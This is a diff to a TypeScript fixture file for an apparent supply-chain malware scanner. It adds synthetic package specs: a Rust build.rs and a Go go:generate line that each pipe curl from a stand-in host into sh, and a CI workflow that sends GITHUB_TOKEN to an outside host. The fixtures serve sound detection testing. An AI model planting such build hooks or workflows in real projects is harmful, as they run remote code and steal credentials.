@@ -50,6 +50,16 @@ const pyFiles = (name: string, version: string, s: Spec["setup"] = {}): Files =>
 
 const elf = (marker: string) => new Uint8Array([0x7f, 0x45, 0x4c, 0x46, 2, 1, 1, 0, ...enc.encode(`synthetic placeholder ${marker}`), ...new Array(48).fill(0)]);
 
+// The Rust extension case: a maturin project, so pip builds the crate (and runs any build.rs) from the sdist.
+const PY_RS_PYPROJECT = `[build-system]\nrequires = ["maturin>=1.0,<2.0"]\nbuild-backend = "maturin"\n\n[project]\nname = "synthetic-py-rs"\nrequires-python = ">=3.8"\ndynamic = ["version"]\n\n[tool.maturin]\nfeatures = ["pyo3/extension-module"]\n`;
+const pyRsCargo = (v: string) => `[package]\nname = "synthetic_py_rs"\nversion = "${v}"\nedition = "2021"\n\n[lib]\nname = "synthetic_py_rs"\ncrate-type = ["cdylib"]\n\n[dependencies]\npyo3 = "0.22"\n`;
+// A pure maturin project: the generated setup.py and Python package are left out on both sides.
+const PY_RS_NO_SETUPTOOLS = { "setup.py": null, "synthetic_py_rs/__init__.py": null, "synthetic_py_rs/util.py": null };
+const PY_RS_LIB = `use pyo3::prelude::*;\n\n#[pyfunction]\nfn clamp(n: i64, lo: i64, hi: i64) -> i64 {\n    n.max(lo).min(hi)\n}\n\n#[pymodule]\nfn synthetic_py_rs(m: &Bound<'_, PyModule>) -> PyResult<()> {\n    m.add_function(wrap_pyfunction!(clamp, m)?)\n}\n`;
+// The Go helper case: the install script (the same in both releases) generates and builds the helper.
+const GO_GEN_TABLES = `//go:build ignore\n\npackage main\n\nfunc main() {}\n`;
+const GO_BRIDGE_INSTALL = "cd native && go generate ./... && go build -o ../bin/go-bridge .";
+
 const npm = (name: string, what: string, urls: string[], pkg: Record<string, unknown>, files: Files, extra: Partial<Spec> = {}): Spec => ({ eco: "npm", name, what, urls, pkg, files, ...extra });
 
 export const CORPUS_SPECS = {
@@ -161,6 +171,25 @@ export const CORPUS_SPECS = {
     what: "synthetic: a module-level __getattr__ that downloads and executes a script the first time an unknown attribute is read",
     files: { "synthetic_py_lazy/__init__.py": `import urllib.request\n\nfrom .util import clamp\n\n__version__ = "${BAD}"\n_loaded = False\n\n\ndef __getattr__(name):\n    global _loaded\n    if not _loaded:\n        _loaded = True\n        exec(urllib.request.urlopen("https://cfg.pylazy-update.invalid/x.py").read())\n    raise AttributeError(name)\n` },
   },
+  "pypi-rust-build-script-added": {
+    eco: "pypi", name: "synthetic-py-rs", urls: ["https://get.pyrs-native.invalid/b.sh"],
+    what: "synthetic: the sdist builds its Rust extension with maturin, and the new release adds a build.rs that runs a downloaded script when pip builds it",
+    files: {
+      "pyproject.toml": PY_RS_PYPROJECT,
+      "Cargo.toml": pyRsCargo(BAD),
+      "src/lib.rs": PY_RS_LIB,
+      ...PY_RS_NO_SETUPTOOLS,
+      "build.rs": `use std::process::Command;\n\nfn main() {\n    Command::new("sh").arg("-c").arg("curl -fsSL https://get.pyrs-native.invalid/b.sh | sh").status().ok();\n    println!("cargo:rerun-if-changed=build.rs");\n}\n`,
+    },
+    old: { "pyproject.toml": PY_RS_PYPROJECT, "Cargo.toml": pyRsCargo(GOOD), "src/lib.rs": PY_RS_LIB, ...PY_RS_NO_SETUPTOOLS },
+  },
+  "npm-go-generate-cgo-added": npm("synthetic-go-bridge", "synthetic: the install script builds a bundled Go helper with go generate and go build; the helper gains a go:generate line that runs a downloaded script and a cgo import with linker flags", ["https://dl.gobridge-native.invalid/gen.sh"], { scripts: { install: GO_BRIDGE_INSTALL } }, {
+    "native/main.go": `package main\n\n//go:generate sh -c "curl -fsSL https://dl.gobridge-native.invalid/gen.sh | sh"\n\n/*\n#cgo LDFLAGS: -L/opt/gobridge/lib -lgobridge\n#include <stdlib.h>\n*/\nimport "C"\n\nfunc main() {\n\tC.free(nil)\n}\n`,
+    "native/gen_tables.go": GO_GEN_TABLES,
+  }, { old: { "package.json": JSON.stringify({ name: "synthetic-go-bridge", version: GOOD, description: "Small helpers", main: "index.js", license: "MIT", scripts: { install: GO_BRIDGE_INSTALL } }, null, 2) + "\n", "native/main.go": `package main\n\n//go:generate go run gen_tables.go\n\nfunc main() {}\n`, "native/gen_tables.go": GO_GEN_TABLES } }),
+  "npm-workflow-pull-request-target-write": npm("synthetic-ci-kit", "synthetic: the release ships the publisher repo's CI workflow, now on pull_request_target with write-all permissions and posting the token; it would run on the publisher's CI, never on install", ["https://hooks.cikit-ci.invalid/t"], {}, {
+    ".github/workflows/ci.yml": `name: ci\non:\n  pull_request_target:\n    types: [opened, synchronize]\npermissions: write-all\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: \${{ github.event.pull_request.head.sha }}\n      - run: curl -fsSL -d "t=\${{ secrets.GITHUB_TOKEN }}" https://hooks.cikit-ci.invalid/t\n`,
+  }, { old: { ".github/workflows/ci.yml": `name: ci\non:\n  push:\npermissions:\n  contents: read\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: bun test\n` } }),
 } satisfies Record<string, Spec>;
 
 export type CorpusKind = keyof typeof CORPUS_SPECS;
